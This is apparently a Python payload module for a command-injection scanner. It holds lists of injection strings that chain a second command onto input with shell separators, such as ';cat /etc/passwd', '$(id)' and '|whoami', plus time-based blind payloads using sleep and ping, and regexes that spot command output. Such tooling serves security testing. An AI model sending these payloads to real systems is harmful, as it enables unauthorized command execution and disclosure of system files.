# -*- coding: utf-8 -*-
"""
命令注入测试载荷模块
"""

import os


def load_payloads(file_path):
    """
    从文件加载载荷列表
    """
    if not os.path.exists(file_path):
        print(f"[!] 警告：载荷文件不存在 -> {file_path}")
        return []
    
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    return payloads


def get_builtin_basic_payloads():
    """
    内置基础命令注入载荷
    """
    return [
        ";id",
        "|id",
        "||id",
        "&id",
        "&&id",
        "`id`",
        "$(id)",
        ";whoami",
        "|whoami",
        ";uname -a",
        ";ls -la",
        ";dir",
        ";cat /etc/passwd",
        ";type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "%0aid",
        "%0awhoami",
        "\nid",
        "\nwhoami",
        ";hostname",
        ";pwd",
        ";echo test123",
        ";ifconfig",
        ";ipconfig",
    ]


def get_builtin_time_payloads():
    """
    内置时间盲注载荷
    """
    return [
        ";sleep 5",
        "|sleep 5",
        "||sleep 5",
        "&sleep 5",
        "&&sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
        ";sleep 10",
        "|sleep 10",
        ";ping -c 5 127.0.0.1",
        "|ping -c 5 127.0.0.1",
        ";ping -n 5 127.0.0.1",
        ";timeout /t 5",
        "%0asleep 5",
    ]


# 响应中常见的命令执行成功特征
COMMAND_SUCCESS_PATTERNS = [
    # id命令
    r'uid=\d+\([a-zA-Z0-9_-]+\)',
    r'gid=\d+\([a-zA-Z0-9_-]+\)',
    # whoami命令
    r'(root|admin|administrator|www-data|apache|nobody)',
    # Linux命令输出特征
    r'Linux',
    r'GNU/Linux',
    r'drwxr-xr-x',
    r'total\s+\d+',
    r'root\s+.*\s+.*\s+.*\s+/',
    # Windows命令输出特征
    r'Microsoft Windows',
    r'Windows\s+IP\s+Configuration',
    r'Directory of',
    r'Volume Serial Number',
    r'\.\.\<DIR\>',
    # 通用特征
    r'/bin/bash',
    r'/usr/bin/',
    r'C:\\Windows',
    r'C:\\Users',
    r'hostname',
    r'PID TTY',
    r'netstat',
    r'127\.0\.0\.1',
]